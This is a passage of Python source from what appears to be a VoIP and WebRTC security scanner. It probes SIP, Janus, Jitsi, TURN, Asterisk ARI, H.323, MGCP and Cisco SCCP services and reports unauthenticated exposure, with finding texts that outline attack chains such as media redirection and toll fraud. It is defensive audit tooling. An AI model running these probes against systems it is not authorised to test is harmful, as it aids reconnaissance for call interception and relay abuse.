            'title': 'SIP_LATE_MEDIA_ACCEPT',
            'detail': (
                f'{host}:{port} returned {code2} to an INVITE with no SDP '
                f'body (offer-less INVITE per RFC 3261 §13.2.1 / late-media '
                f'model). The server accepted the session setup without an '
                f'initial media offer, deferring negotiation to the 200 OK '
                f'body. An attacker controlling the timing of the ACK SDP '
                f'answer can substitute arbitrary RTP endpoints, causing the '
                f'remote UA to stream media to an attacker-controlled address. '
                f'This surface is particularly dangerous when combined with an '
                f'unauthenticated REGISTER hijack: de-register, re-register to '
                f'attacker UA, send offer-less INVITE, inject RTP endpoint in '
                f'ACK. Reference: RFC 3261 §13.2.1; RFC 3264 §5 (offer/answer '
                f'model); Hacking Exposed UC&VoIP ch11.'
            ),
            'host': host,
            'port': port,
        })
        # Terminate the dialog
        br_bye2 = _branch()
        bye2 = '\r\n'.join([
            f'BYE sip:1000@{host} SIP/2.0',
            f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br_bye2}',
            'Max-Forwards: 70',
            f'From: <sip:probe@{local_ip}>;tag={tag2}',
            f'To: <sip:1000@{host}>',
            f'Call-ID: {cid2}',
            'CSeq: 2 BYE',
            'Content-Length: 0',
            '',
            '',
        ])
        _send_udp_sip(host, port, bye2, 2.0)

    # ------------------------------------------------------------------
    # Probe 3: SUBSCRIBE to dialog event package (RFC 4235)
    # RFC 4235 defines the "dialog" event package that notifies
    # subscribers about active call dialogs. If the server returns 200 OK
    # with a NOTIFY containing active dialog state, an unauthenticated
    # observer can enumerate in-progress calls, extract remote URIs, and
    # time eavesdrop attempts against RTP streams.
    # ------------------------------------------------------------------
    br3 = _branch()
    cid3 = _call_id(host)
    tag3 = _tag()
    subscribe_dialog = '\r\n'.join([
        f'SUBSCRIBE sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}',
        'Max-Forwards: 70',
        f'From: <sip:monitor@{local_ip}>;tag={tag3}',
        f'To: <sip:{host}>',
        f'Call-ID: {cid3}',
        'CSeq: 1 SUBSCRIBE',
        f'Contact: <sip:monitor@{local_ip}:5060>',
        'Event: dialog',
        'Accept: application/dialog-info+xml',
        'Expires: 30',
        'Content-Length: 0',
        '',
        '',
    ])
    resp3 = _send_udp_sip(host, port, subscribe_dialog, timeout)
    code3 = _parse_status_code(resp3)
    if code3 == 200:
        # Attempt to receive a NOTIFY with dialog state via a short listen
        notify_body = ''
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.bind((local_ip, 0))
            data, _ = sock.recvfrom(8192)
            notify_body = data.decode('utf-8', errors='replace')
            sock.close()
        except Exception:
            pass
        active_call = 'dialog' in notify_body.lower() or 'confirmed' in notify_body.lower()
        sev = 'CRITICAL' if active_call else 'HIGH'
        detail_extra = (
            f' NOTIFY body contained active dialog state, confirming '
            f'live call information is exposed.'
            if active_call else
            f' No NOTIFY received within timeout; 200 OK alone indicates '
            f'the server accepted the unauthenticated dialog subscription.'
        )
        findings.append({
            'severity': sev,
            'title': 'SIP_DIALOG_MONITOR',
            'detail': (
                f'{host}:{port} returned 200 OK to an unauthenticated '
                f'SUBSCRIBE Event: dialog (RFC 4235) targeting the server '
                f'AOR. RFC 4235 §5 requires authentication for dialog '
                f'subscriptions because the NOTIFY payload discloses active '
                f'call participants, dialog state (early/confirmed/terminated), '
                f'remote URIs, and timing.{detail_extra} An attacker with this '
                f'subscription can enumerate all in-progress calls in real time, '
                f'correlate dialog IDs with RTP port assignments, and time '
                f'media-layer interception attempts. Reference: RFC 4235; '
                f'Hacking Exposed UC&VoIP ch11 (call monitoring via SIP '
                f'event packages).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 4: OPTIONS — check Allow header for SAVP/SRTP absence
    # RFC 3261 §20.5 OPTIONS returns server capabilities. If the Allow
    # header lists no SAVP-profile methods and the server never challenges
    # with Require: SRTP, the deployment advertises no path to encrypted
    # media and will negotiate plain RTP for all sessions.
    # ------------------------------------------------------------------
    br4 = _branch()
    cid4 = _call_id(host)
    tag4 = _tag()
    options_msg = '\r\n'.join([
        f'OPTIONS sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br4}',
        'Max-Forwards: 70',
        f'From: <sip:probe@{local_ip}>;tag={tag4}',
        f'To: <sip:{host}>',
        f'Call-ID: {cid4}',
        'CSeq: 1 OPTIONS',
        f'Contact: <sip:probe@{local_ip}:5060>',
        'Accept: application/sdp',
        'Content-Length: 0',
        '',
        '',
    ])
    resp4 = _send_udp_sip(host, port, options_msg, timeout)
    code4 = _parse_status_code(resp4)
    if code4 == 200:
        allow_hdr = _parse_header(resp4, 'Allow').lower()
        supported_hdr = _parse_header(resp4, 'Supported').lower()
        has_savp = any(token in allow_hdr + supported_hdr for token in ('savp', 'srtp', 'sdes'))
        if not has_savp:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SIP_SAVP_NOT_ADVERTISED',
                'detail': (
                    f'{host}:{port} returned 200 OK to OPTIONS with Allow: '
                    f'{_parse_header(resp4, "Allow")!r} and Supported: '
                    f'{_parse_header(resp4, "Supported")!r}. Neither header '
                    f'contains SAVP, SRTP, or SDES tokens. RFC 4568 §5 and '
                    f'RFC 3711 require RTP/SAVP profile advertisement when '
                    f'the server supports encrypted media. Absence of this '
                    f'advertisement indicates the server will not propose or '
                    f'enforce SRTP on any outbound or inbound session, '
                    f'guaranteeing unencrypted media paths for all calls. '
                    f'On-path capture is trivially feasible with standard '
                    f'packet capture tools. Reference: RFC 3711; RFC 4568; '
                    f'RFC 3261 §20.5; Hacking Exposed UC&VoIP ch11.'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_webrtc_signaling_exposure(host: str, port: int = 8443,
                                    timeout: float = 10.0) -> list:
    """Detect exposed WebRTC signaling and media-relay infrastructure.

    Probes four distinct service families that collectively constitute the
    modern VoIP/WebRTC stack, applying the same service-identification
    methodology described in Hacking and Security ch11 (Scanning Targets of
    Interest, §11.3): send a minimal valid protocol unit, observe whether
    the server issues a protocol-layer response rather than silently
    dropping or redirecting to authentication, then classify exposure by
    severity.

    Checked surfaces:
      1. Janus Gateway REST API (HTTP/8088, HTTPS/8089, HTTPS/<port>):
         GET /janus -> {"janus":"welcome"} confirms unauthenticated access.
         GET /janus/info -> version and plugin disclosure.
         POST /janus {"janus":"create"} -> unauthenticated session creation.

      2. Jitsi Meet BOSH and config endpoints (HTTP/80, HTTPS/443):
         GET /http-bind -> BOSH (XMPP-over-HTTP) endpoint active (HTTP 400
         on empty body is a confirming response per XEP-0124 §9.1).
         GET /about/config -> configuration JSON with TURN credentials,
         XMPP domain, and analytics tokens.

      3. Coturn TURN/STUN server (UDP/3478, UDP/3479):
         STUN Binding Request (RFC 5389): type=0x0001, magic=0x2112A442.
         Any Binding Response (0x0101) confirms a live STUN/TURN server.
         TURN Allocate (RFC 5766): type=0x0003 without credentials.
         A non-error response (not 0x0113) is an unauthenticated relay.

      4. Asterisk REST Interface / ARI (HTTP/8088, HTTPS/8089):
         GET /ari/api-docs/resources.json -> Swagger spec exposed.
         GET /ari/asterisk/info -> system version and config without auth.

    Reference: Janus REST API docs; XEP-0124 BOSH; RFC 5389; RFC 5766;
    Asterisk ARI; CVE-2020-10591; CVE-2019-18791; OWASP API3:2023.

    Returns List[dict] with keys: severity, title, detail, host, port.
    Severities used: CRITICAL, HIGH.
    """
    import ssl
    import struct
    import urllib.request
    import urllib.error
    import json
    import os

    findings: list = []

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------
    def _http_get(scheme, h, p, path, t):
        """HTTP/HTTPS GET; returns (status_code, body_str) or (None, None)."""
        url = f'{scheme}://{h}:{p}{path}'
        req = urllib.request.Request(
            url, headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, */*'}
        )
        try:
            if scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=t, context=ctx) as resp:
                    return resp.getcode(), resp.read(65536).decode('utf-8', errors='replace')
            else:
                with urllib.request.urlopen(req, timeout=t) as resp:
                    return resp.getcode(), resp.read(65536).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as exc:
            try:
                return exc.code, exc.read(4096).decode('utf-8', errors='replace')
            except Exception:
                return exc.code, ''
        except Exception:
            return None, None

    def _http_post_json(scheme, h, p, path, payload, t):
        """HTTP/HTTPS POST JSON; returns (status_code, body_str) or (None, None)."""
        url = f'{scheme}://{h}:{p}{path}'
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            url, data=data,
            headers={
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            method='POST',
        )
        try:
            if scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=t, context=ctx) as resp:
                    return resp.getcode(), resp.read(65536).decode('utf-8', errors='replace')
            else:
                with urllib.request.urlopen(req, timeout=t) as resp:
                    return resp.getcode(), resp.read(65536).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as exc:
            try:
                return exc.code, exc.read(4096).decode('utf-8', errors='replace')
            except Exception:
                return exc.code, ''
        except Exception:
            return None, None

    # ------------------------------------------------------------------
    # Probe 1: Janus Gateway REST API
    # Janus is the Meetecho WebRTC media gateway. The REST API is protected
    # by an optional api-secret (--api-secret) and apisecret header; without
    # it the full session/handle/plugin graph is accessible without auth.
    # CVE-2020-10591: unauthenticated session creation leads to admin API
    # access. Identifying response: {"janus":"welcome","transaction":"..."}.
    # ------------------------------------------------------------------
    janus_candidates = [('http', 8088), ('https', 8089), ('https', port)]
    for scheme, janus_port in janus_candidates:
        code, body = _http_get(scheme, host, janus_port, '/janus', timeout)
        if body and '"janus"' in body and 'welcome' in body.lower():
            findings.append({
                'severity': 'CRITICAL',
                'title': 'JANUS_WEBRTC_GATEWAY_UNAUTH',
                'detail': (
                    f'{host}:{janus_port} Janus WebRTC Gateway returned unauthenticated '
                    f'welcome response on GET /janus (HTTP {code}). Body excerpt: '
                    f'{body[:200]!r}. The Janus REST API is fully accessible without '
                    f'credentials. An attacker can create sessions, attach VideoRoom, '
                    f'AudioBridge, and Streaming plugins, and relay media without any '
                    f'auth gate. api-secret (--api-secret) not configured. '
                    f'Reference: Janus REST API; CVE-2020-10591.'
                ),
                'host': host,
                'port': janus_port,
            })
            # /janus/info -- server version and plugin list
            code2, body2 = _http_get(scheme, host, janus_port, '/janus/info', timeout)
            if body2 and code2 is not None and 'janus' in body2.lower():
                findings.append({
                    'severity': 'HIGH',
                    'title': 'JANUS_SERVER_INFO',
                    'detail': (
                        f'{host}:{janus_port} GET /janus/info returned HTTP {code2} '
                        f'with server metadata: {body2[:300]!r}. Janus version, loaded '
                        f'plugin list, and build configuration are disclosed. Version '
                        f'data scopes known CVEs; plugin list reveals active attack '
                        f'surfaces (e.g. VideoRoom RTP bridge, Streaming RTSP sink).'
                    ),
                    'host': host,
                    'port': janus_port,
                })
            # POST /janus -- create session without auth
            code3, body3 = _http_post_json(
                scheme, host, janus_port, '/janus',
                {'janus': 'create', 'transaction': 'probe00001'},
                timeout,
            )
            if body3 and 'session_id' in body3.lower():
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'JANUS_SESSION_CREATE_UNAUTH',
                    'detail': (
                        f'{host}:{janus_port} POST /janus with create transaction '
                        f'returned a session_id without authentication (HTTP {code3}). '
                        f'Body: {body3[:200]!r}. Full WebRTC media-relay chain is '
                        f'accessible. Attacker can attach handles, negotiate SDP, '
                        f'and forward audio/video streams through the server.'
                    ),
                    'host': host,
                    'port': janus_port,
                })
            break  # found Janus; skip remaining candidates

    # ------------------------------------------------------------------
    # Probe 2: Jitsi Meet -- BOSH endpoint and configuration disclosure
    # Jitsi uses XMPP-over-BOSH (XEP-0124) for signaling. The BOSH
    # endpoint at /http-bind returns HTTP 400 on a GET with no body,
    # which per XEP-0124 §9.1 is a protocol-conformant error response
    # confirming the endpoint is active. /about/config returns deployment
    # configuration including TURN server credentials and XMPP MUC names.
    # ------------------------------------------------------------------
    jitsi_candidates = [('https', 443), ('http', 80), ('https', port)]
    for scheme, jitsi_port in jitsi_candidates:
        code, body = _http_get(scheme, host, jitsi_port, '/http-bind', timeout)
        if code in (200, 400) and body is not None:
            findings.append({
                'severity': 'HIGH',
                'title': 'JITSI_BOSH_ENDPOINT',
                'detail': (
                    f'{host}:{jitsi_port} GET /http-bind responded HTTP {code}. '
                    f'Active BOSH (Bidirectional-streams Over Synchronous HTTP, '
                    f'XEP-0124) endpoint detected. Jitsi Meet uses BOSH for XMPP '
                    f'signaling; HTTP 400 on empty GET is a conformant confirming '
                    f'response. Endpoint enables SIP-equivalent session establishment '
                    f'without requiring WebRTC peer validation. '
                    f'Reference: XEP-0124 BOSH §9.1; RFC 4711.'
                ),
                'host': host,
                'port': jitsi_port,
            })
            break

    for scheme, jitsi_port in jitsi_candidates:
        code, body = _http_get(scheme, host, jitsi_port, '/about/config', timeout)
        if code == 200 and body and any(
            k in body for k in ('xmpp', 'hosts', 'bosh', 'domain', 'turn', 'stun')
        ):
            findings.append({
                'severity': 'HIGH',
                'title': 'JITSI_CONFIG_DISCLOSED',
                'detail': (
                    f'{host}:{jitsi_port} GET /about/config returned HTTP 200 '
                    f'with Jitsi deployment configuration: {body[:300]!r}. '
                    f'Typically contains XMPP domain, MUC conference room prefix, '
                    f'TURN/STUN server addresses with credentials, and third-party '
                    f'analytics integration tokens. TURN credentials allow relay '
                    f'abuse; XMPP domain enables user enumeration. '
                    f'Reference: Jitsi Meet deployment docs; OWASP WSTG-CONF-002.'
                ),
                'host': host,
                'port': jitsi_port,
            })
            break

    # ------------------------------------------------------------------
    # Probe 3: Coturn TURN/STUN server -- UDP/3478, UDP/3479
    # RFC 5389 STUN Binding Request: 20-byte message.
    #   Bytes 0-1: message type 0x0001 (Binding Request)
    #   Bytes 2-3: message length 0x0000 (no attributes)
    #   Bytes 4-7: magic cookie 0x2112A442
    #   Bytes 8-19: 12-byte random transaction ID
    # A Binding Response (type 0x0101) confirms a live STUN/TURN server.
    # RFC 5766 TURN Allocate Request: type 0x0003, same header format.
    # A response other than 0x0113 (Allocate Error Response) without
    # authentication challenge is an unauthenticated relay allocation.
    # ------------------------------------------------------------------
    for turn_port in (3478, 3479):
        tx_id = os.urandom(12)
        stun_req = struct.pack('>HHI', 0x0001, 0, 0x2112A442) + tx_id
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(stun_req, (host, turn_port))
            data, _ = sock.recvfrom(1024)
            sock.close()
            if len(data) >= 4:
                msg_type = struct.unpack('>H', data[:2])[0]
                if msg_type == 0x0101:  # Binding Success Response
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'TURN_STUN_RESPONSIVE',
                        'detail': (
                            f'UDP {host}:{turn_port} returned STUN Binding Success '
                            f'Response (0x0101, {len(data)} bytes) to a Binding '
                            f'Request. STUN/TURN server (Coturn or compatible) is '
                            f'reachable and operational. STUN is used for NAT '
                            f'traversal; a live TURN server warrants authentication '
                            f'configuration audit. Reference: RFC 5389 §6; RFC 5766.'
                        ),
                        'host': host,
                        'port': turn_port,
                    })
                # TURN Allocate Request without credentials
                turn_alloc = struct.pack('>HHI', 0x0003, 0, 0x2112A442) + tx_id
                try:
                    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock2.settimeout(timeout)
                    sock2.sendto(turn_alloc, (host, turn_port))
                    data2, _ = sock2.recvfrom(1024)
                    sock2.close()
                    if len(data2) >= 4:
                        msg_type2 = struct.unpack('>H', data2[:2])[0]
                        # 0x0113 = Allocate Error Response (auth required)
                        # anything else = unauthenticated allocation or success
                        if msg_type2 != 0x0113:
                            findings.append({
                                'severity': 'CRITICAL',
                                'title': 'TURN_ALLOCATE_UNAUTH',
                                'detail': (
                                    f'UDP {host}:{turn_port} responded to TURN Allocate '
                                    f'(0x0003) without authentication challenge '
                                    f'(response type 0x{msg_type2:04x}, {len(data2)} bytes). '
                                    f'Unauthenticated TURN relay is a full network-relay '
                                    f'primitive: any attacker can proxy arbitrary TCP/UDP '
                                    f'traffic through this host, bypassing NAT and firewalls '
                                    f'that permit TURN egress. Long-term credentials '
                                    f'(RFC 5766 §10) are not enforced. '
                                    f'Reference: RFC 5766 §9; RFC 8656.'
                                ),
                                'host': host,
                                'port': turn_port,
                            })
                except Exception:
                    pass
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Probe 4: Asterisk REST Interface (ARI) -- HTTP/8088, HTTPS/8089
    # ARI exposes full PBX administration over HTTP REST+WebSocket.
    # The /ari/api-docs/resources.json Swagger spec is served without
    # authentication on default Asterisk deployments. Scope: channels,
    # bridges, endpoints, sounds, mailboxes, recordings.
    # Reference: Asterisk ARI; CVE-2019-18791; OWASP API3:2023.
    # ------------------------------------------------------------------
    ari_candidates = [('http', 8088), ('https', 8089), ('https', port)]
    for scheme, ari_port in ari_candidates:
        code, body = _http_get(
            scheme, host, ari_port, '/ari/api-docs/resources.json', timeout
        )
        if (code == 200 and body and
                any(k in body.lower() for k in ('asterisk', 'ari', 'swagger', '"apis"'))):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASTERISK_ARI_EXPOSED',
                'detail': (
                    f'{host}:{ari_port} GET /ari/api-docs/resources.json returned '
                    f'HTTP {code} with Asterisk ARI Swagger specification: '
                    f'{body[:200]!r}. ARI is accessible without authentication. '
                    f'Full PBX control surface exposed: channels, bridges, '
                    f'endpoints, recordings, sounds, mailboxes. Attacker can '
                    f'originate calls, bridge sessions, and exfiltrate call '
                    f'recordings. Reference: Asterisk ARI; CVE-2019-18791; '
                    f'OWASP API3:2023.'
                ),
                'host': host,
                'port': ari_port,
            })
            code2, body2 = _http_get(scheme, host, ari_port, '/ari/asterisk/info', timeout)
            if code2 == 200 and body2:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ASTERISK_INFO_UNAUTH',
                    'detail': (
                        f'{host}:{ari_port} GET /ari/asterisk/info returned HTTP 200 '
                        f'with system information: {body2[:300]!r}. Asterisk version, '
                        f'build ID, system name, and uptime disclosed without '
                        f'authentication. Version data scopes applicable CVEs.'
                    ),
                    'host': host,
                    'port': ari_port,
                })
            break  # found ARI; skip remaining candidates

    return findings


def probe_h323_and_media_gateway(host: str, port: int = 1720,
                                  timeout: float = 5.0) -> list:
    """Detect H.323 call signaling, H.323 RAS gatekeeper, MGCP, and Cisco SCCP exposure.

    Probes four legacy VoIP/telephony protocol surfaces from a single call.
    Methodology follows Hacking and Security ch11 §11.3-§11.4 (service
    scanning and vulnerability identification): send a minimal syntactically
    valid protocol unit to the canonical service port, observe whether the
    server issues a protocol-layer response, classify by the information
    content of the response (banner-grade vs. authenticated).

    Checked surfaces:
      1. H.323 Q.931 call signaling on TCP/<port> (default 1720):
         TPKT-framed Q.931 SETUP with Bearer Capability IE triggers a
         ReleaseComplete, Alerting, or Connect response from any H.323
         endpoint (terminal, gateway, MCU). Presence of Q.931 protocol
         discriminator (0x08), User-User IE tag (0x7e), or TPKT version
         byte (0x03) in the response confirms H.323 protocol handling.

      2. H.323 Gatekeeper RAS on UDP/1719:
         A stub H.225 RAS GatekeeperRequest (GRQ, CHOICE index 0) sent
         to the RAS port; any response (GCF or GRJ) confirms a gatekeeper.
         Gatekeepers control endpoint registration, admission, and bandwidth;
         unauthenticated access enables rogue endpoint registration.

      3. Media Gateway Control Protocol (MGCP) on UDP/2427 (RFC 3435):
         AUEP (Audit Endpoint) command queries a media gateway for endpoint
         capabilities. RFC 3435 §5 requires IPsec for security; the base
         protocol has no auth. Any response confirms a reachable gateway;
         a 200 OK with capability lines (X:/S:/A:/I: headers) is CRITICAL.

      4. Cisco SCCP (Skinny) on TCP/2000:
         Minimal KeepAlive message: 4-byte length (LE) + 4-byte reserved +
         4-byte message type 0x0000 (KeepAlive). Cisco CallManager/CME
         returns KeepAliveAck (0x0100). Without SCCP-TLS (TCP/2443) and
         CAPF certificate provisioning, all phone signaling is cleartext.

    Reference: ITU-T H.323; ITU-T Q.931; RFC 3435; Cisco SCCP spec;
    CVE-2007-4323; Cisco CUCM Security Guide §12.

    Returns List[dict] with keys: severity, title, detail, host, port.
    Severities used: CRITICAL, HIGH.
    """
    import struct

    findings: list = []

    # ------------------------------------------------------------------
    # Probe 1: H.323 Q.931 call signaling -- TCP/<port> (default 1720)
    # TPKT frame (RFC 1006): version=0x03, reserved=0x00,
    #   length=0x000e (14 bytes total).
    # Q.931 SETUP payload (ITU-T Q.931):
    #   0x08 = protocol discriminator
    #   0x02 0x01 0x01 = call reference (length=2, value=0x0101)
    #   0x05 = message type SETUP
    #   0x04 0x03 0x80 0x90 0xa3 = Bearer Capability IE (speech, G.711)
    # Any H.323 endpoint responds with ReleaseComplete/Alerting/Connect.
    # ------------------------------------------------------------------
    setup_frame = b'\x03\x00\x00\x0e\x08\x02\x01\x01\x05\x04\x03\x80\x90\xa3'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(setup_frame)
        resp = b''
        try:
            resp = s.recv(2048)
        except socket.timeout:
            pass
        s.close()
        if resp:
            findings.append({
                'severity': 'HIGH',
                'title': 'H323_Q931_RESPONSIVE',
                'detail': (
                    f'TCP {host}:{port} responded to H.323 Q.931 TPKT SETUP frame '
                    f'({len(resp)} bytes; first 32: {resp[:32].hex()}). Active H.323 '
                    f'call-signaling port confirmed. Without H.323 application-layer '
                    f'gateway inspection, crafted SETUP/RELEASE sequences enable toll '
                    f'fraud and call hijacking. Reference: ITU-T Q.931; ITU-T H.225.'
                ),
                'host': host,
                'port': port,
            })
            # H.323 protocol markers: Q.931 PD (0x08), User-User IE (0x7e),
            # TPKT version (0x03 0x00 prefix in response frame)
            h323_markers = (b'\x08', b'\x7e', b'\x03\x00')
            if any(m in resp for m in h323_markers) and len(resp) >= 8:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'H323_CALL_SETUP_RESPONSIVE',
                    'detail': (
                        f'TCP {host}:{port} H.323 SETUP response contains Q.931/H.225 '
                        f'protocol marker bytes (raw: {resp[:64].hex()}). Confirmed '
                        f'H.323 endpoint with active call-signaling handling. Full '
                        f'call-setup interaction is possible: toll fraud, call '
                        f'redirection, and DoS via malformed SETUP are demonstrated '
                        f'attack classes. Reference: ITU-T H.323 §8; CVE-2007-4323.'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    # ------------------------------------------------------------------
    # Probe 2: H.323 Gatekeeper RAS -- UDP/1719
    # H.225 RAS message is ASN.1 PER encoded. RasMessage CHOICE index 0
    # is GatekeeperRequest (GRQ). A stub GRQ is enough to elicit a
    # GatekeeperConfirm (GCF) or GatekeeperReject (GRJ) -- either response
    # confirms a gatekeeper. GCF without auth challenge = unauthenticated
    # endpoint registration surface.
    # Reference: ITU-T H.225.0 §7.3; RFC 3508.
    # ------------------------------------------------------------------
    ras_port = 1719
    # Minimal ASN.1 PER unaligned stub GRQ: CHOICE index 0 (GRQ) followed
    # by minimal requestSeqNum and stub endpointType/rasAddress fields.
    grq_stub = b'\x00\x00\x01\x00\x00'
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(grq_stub, (host, ras_port))
        data, _ = sock.recvfrom(1024)
        sock.close()
        if data:
            findings.append({
                'severity': 'HIGH',
                'title': 'H323_GATEKEEPER_RESPONSIVE',
                'detail': (
                    f'UDP {host}:{ras_port} responded to H.225 RAS GatekeeperRequest '
                    f'stub ({len(data)} bytes; first 16: {data[:16].hex()}). H.323 '
                    f'Gatekeeper confirmed. Gatekeepers control endpoint registration, '
                    f'call admission, and bandwidth: unauthenticated access enables '
                    f'rogue endpoint registration and call redirection. '
                    f'Reference: ITU-T H.225.0 §7.3; RFC 3508.'
                ),
                'host': host,
                'port': ras_port,
            })
    except Exception:
        pass

    # ------------------------------------------------------------------
    # Probe 3: MGCP -- UDP/2427
    # AUEP (Audit Endpoint) is a mandatory MGCP command (RFC 3435 §2.3.9).
    # It requests the gateway to report its current state and capabilities.
    # RFC 3435 §5 mandates IPsec for security; the base protocol has no
    # authentication mechanism. A 200 response with capability lines
    # (X: connections, S: capabilities, etc.) fully describes the media
    # gateway codec and codec negotiation surface.
    # Reference: RFC 3435; RFC 2705.
    # ------------------------------------------------------------------
    mgcp_port = 2427
    mgcp_auep = b'AUEP 1234 * MGCP 1.0\r\n\r\n'
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(mgcp_auep, (host, mgcp_port))
        data, _ = sock.recvfrom(4096)
        sock.close()
        if data:
            resp_str = data.decode('utf-8', errors='replace')
            findings.append({
                'severity': 'HIGH',
                'title': 'MGCP_RESPONSIVE',
                'detail': (
                    f'UDP {host}:{mgcp_port} responded to MGCP AUEP command '
                    f'({len(data)} bytes): {resp_str[:200]!r}. Media Gateway '
                    f'accepting unauthenticated MGCP commands. RFC 3435 §5 '
                    f'requires IPsec for protection; base MGCP has no auth. '
                    f'Reference: RFC 3435 §5; RFC 2705.'
                ),
                'host': host,
                'port': mgcp_port,
            })
            # 200 OK or capability header lines = deeper exposure
            has_200 = resp_str.lstrip().startswith('200')
            has_caps = any(
                tag in resp_str for tag in ('X:', 'S:', 'A:', 'I:', 'O:', 'Z:')
            )
            if has_200 or has_caps:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'MGCP_ENDPOINT_INFO',
                    'detail': (
                        f'UDP {host}:{mgcp_port} MGCP AUEP response contains endpoint '
                        f'capability information: {resp_str[:300]!r}. Capability lines '
                        f'expose supported codecs, connection modes, and endpoint '
                        f'identifiers. With MGCP RQNT/NTFY primitives, an attacker can '
                        f'inject DTMF events, redirect media streams, and intercept '
                        f'in-band signaling tones. '
                        f'Reference: RFC 3435 §3.3; RFC 2833.'
                    ),
                    'host': host,
                    'port': mgcp_port,
                })
    except Exception:
        pass

    # ------------------------------------------------------------------
    # Probe 4: Cisco SCCP (Skinny) -- TCP/2000
    # Skinny Client Control Protocol is Cisco's proprietary IP phone
    # signaling protocol. Cisco CallManager/CME listens on TCP/2000.
    # SCCP-TLS (TCP/2443) with CAPF certificate provisioning is required
    # for encrypted signaling; TCP/2000 carries cleartext.
    # KeepAlive message format (SCCP): [length:uint32-LE][reserved:uint32-LE]
    # [msg_type:uint32-LE][data]. For KeepAlive (0x0000): no data payload;
    # length = 4 (reserved) + 4 (msg_type) = 8.
    # KeepAliveAck response: msg_type 0x0100.
    # Reference: Cisco SCCP spec; Cisco CUCM Security Guide §12.
    # ------------------------------------------------------------------
    sccp_port = 2000
    # length=8 (reserved 4B + msg_type 4B), reserved=0, msg_type=0x0000 (KeepAlive)
    sccp_keepalive = struct.pack('<III', 8, 0, 0x0000)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, sccp_port))
        s.sendall(sccp_keepalive)
        resp = b''
        try:
            resp = s.recv(512)
        except socket.timeout:
            pass
        s.close()
        if resp:
            findings.append({
                'severity': 'HIGH',
                'title': 'SCCP_SKINNY_RESPONSIVE',
                'detail': (
                    f'TCP {host}:{sccp_port} responded to SCCP KeepAlive probe '
                    f'({len(resp)} bytes; hex: {resp[:32].hex()}). Cisco Skinny '
                    f'(SCCP) CallManager port active. Without SCCP-TLS (TCP/2443) '
                    f'and CAPF certificate provisioning, all phone signaling is '
                    f'transmitted in cleartext: registration, call setup, DTMF, '
                    f'and transfer events are trivially captured on-path. '
                    f'Reference: Cisco SCCP Protocol Specification; '
                    f'Cisco CUCM Security Guide §12.'
                ),
                'host': host,
                'port': sccp_port,
            })
    except Exception:
        pass

    return findings

    return findings
